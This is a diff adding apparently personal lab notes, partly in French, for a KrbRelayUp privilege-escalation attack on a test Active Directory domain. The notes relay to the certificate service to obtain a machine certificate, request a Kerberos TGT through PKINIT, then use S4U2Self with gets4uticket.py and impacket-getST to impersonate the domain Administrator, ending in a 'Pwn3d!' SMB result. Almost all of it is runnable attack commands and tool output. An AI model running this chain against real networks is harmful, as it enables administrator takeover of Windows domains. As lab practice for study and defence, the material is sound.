@@ -1,0 +1,110 @@
+
+je configure adcs:
+
+DC1.lab.local\lab-DC1-CA
+
+
+
+.\KrbRelayUp.exe relay -d lab.local -dc DC1.lab.local -m adcs
+
+
+then I will do these steps manually:
+
+
+
+Using said certificate to obtain a TGT for the local machine account via PKInit. (Rubeus)
+Using the TGT to obtain privileged ST to local machine via S4U2Self and TGSSUB. (Rubeus)
+
+
+
+1)
+
+echo "base64cert" | base64 -d > cert.pfx
+
+
+lets see if Its a valid certificate:
+
+
+openssl pkcs12 -info -in cert.pfx
+
+(I use test as a passphrase)
+
+
+
+
+2) requesting a .ccache file:
+
+
+python3 gettgtpkinit.py -cert-pfx "/home/kali/hack/labs/krbrelayUp/cert.pfx" \
+-dc-ip 192.168.10.10 LAB.local/Win11E\$ \
+"/home/kali/hack/labs/krbrelayUp/cert.ccache"
+
+
+2025-12-05 15:46:37,214 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-12-05 15:46:37,450 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-12-05 15:46:37,458 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-12-05 15:46:37,458 minikerberos INFO     78210291835a473e705c68340ce712560b4d6bdb50db6b81160b5efb5c4bed56
+INFO:minikerberos:78210291835a473e705c68340ce712560b4d6bdb50db6b81160b5efb5c4bed56
+2025-12-05 15:46:37,460 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+ 
+
+
+
+export KRB5CCNAME=cert.ccache
+
+klist
+Ticket cache: FILE:cert.ccache
+Default principal: Win11E$@LAB.LOCAL
+
+Valid starting       Expires              Service principal
+12/05/2025 15:46:37  12/06/2025 01:46:37  krbtgt/LAB.LOCAL@LAB.LOCAL
+
+
+
+
+
+
+Some Test:
+
+
+
+python3 gets4uticket.py \
+"kerberos+ccache://LAB\Win11E\$:cert.ccache@192.168.10.10/" \
+cifs/Win11E.lab.local@LAB.local \
+Administrateur@LAB.local \
+admin.ccache
+
+
+pour rpc:
+
+python3 gets4uticket.py \
+"kerberos+ccache://LAB\Win11E\$:cert.ccache@192.168.10.10/" \
+host/Win11E.lab.local@LAB.local \
+Administrateur@LAB.local \
+admin.ccache
+
+
+
+
+some S4USelf test:
+
+
+
+impacket-getST -self -impersonate "Administrateur" -altservice "cifs/Win11E.lab.local" -k -no-pass -dc-ip 192.168.10.10 "lab.local"/'Win11E$'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrateur
+[*] Requesting S4U2self
+[*] Changing service from Win11E$@LAB.LOCAL to cifs/DC1.lab.local@LAB.LOCAL
+[*] Saving ticket in Administrateur@cifs_DC1.lab.local@LAB.LOCAL.ccache
+
+
+
+
+Pretty ok
+
+SMB         192.168.10.12   445    WIN11E           [+] lab.local\Administrateur from ccache (Pwn3d!)
